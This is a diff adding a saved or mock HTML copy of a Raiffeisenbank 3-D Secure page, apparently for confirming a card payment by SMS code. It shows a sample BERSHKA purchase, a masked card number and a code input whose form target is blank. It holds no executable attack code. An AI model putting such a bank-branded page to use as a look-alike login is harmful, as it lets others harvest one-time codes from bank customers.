@@ -1,0 +1,106 @@
+<html><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Подтверждение платежа</title>
+    <link type="text/css" href="" rel="STYLESHEET">
+
+    <script type="text/javascript" src="&#10;">
+    </script>
+
+    <meta name="viewport" content="width=device-width user-scalable=no">
+
+
+    <link type="text/css" href="styles/common_new.css" rel="STYLESHEET">
+    <script type="text/javascript" src="js/sms.js"></script>
+
+
+</head>
+<body>
+<div class="main">
+
+
+
+    <div class="logo_container">
+
+        <div class="raif_logo">
+            <img class="logo raif_logo_img" src="&#10; /static/3ds/images/raiffeisen.png&#10;&#9;&#9;&#9;&#9; ">
+            <span class="raif_logo_text">Просто. Четко.<br>Компетентно.</span>
+        </div>
+
+        <div class="vendor_logo">
+            <img class="logo" src="&#10; /static/3ds/images/visa.png&#10;&#9;&#9;&#9;">
+        </div>
+    </div>
+    <div class="clear"></div>
+    <form class="form_block" name="form1" action="&#10;" method="POST">
+
+        <input type="hidden" name="acctId" value="">
+        <div class="list">
+            <div>
+                <div class="sum">
+                    100 ₽
+                </div>
+                <div class="clear"></div>
+            </div>
+            <div>
+                <div class="label">Магазин</div>
+                <div class="value">
+                    Магазин BERSHKA
+                </div>
+                <div class="clear"></div>
+            </div>
+            <div>
+                <div class="label">Дата</div>
+                <div class="value">
+                    02.04.2019
+                </div>
+                <div class="clear"></div>
+            </div>
+            <div>
+                <div class="label">Номер карты</div>
+                <div class="value">
+                    ****2345
+                </div>
+                <div class="clear"></div>
+            </div>
+        </div>
+        <div class="gray_block">
+            <div class="list">
+                <input placeholder="Код из SMS" class="in_sms" type="number" pattern="[0-9]*" id="password" name="password" autofocus="">
+
+                <div class="line_in_sms">
+                    <div class="line line-enter-init"></div>
+                </div>
+
+                <div class="clear"></div>
+            </div>
+        </div>
+
+        <div class="text">На Ваш номер телефона
+
+            отправлено sms-сообщение с кодом подтверждения транзакции.
+        </div>
+
+
+        <div class="resend_send">
+            <input type="hidden" id="sendSms" name="sendSms" value="">
+            <div class="resend_link" style="display: block;">Отправить код еще раз</div>
+
+            <div class="text_resent" style="display: none;">Повторно код можно будет отправить через 1 сек.</div>
+
+        </div>
+
+        <div class="cancel_pay">
+            <a class="exit_link" href="">Отменить оплату</a>
+        </div>
+
+        <div class="info">
+            <div class="footer_info">
+                АО «Райффайзенбанк»<br>
+                Генеральная лицензия Банка России №3292 от 17.02.2015
+            </div>
+        </div>
+    </form>
+</div>
+
+
+</body></html>
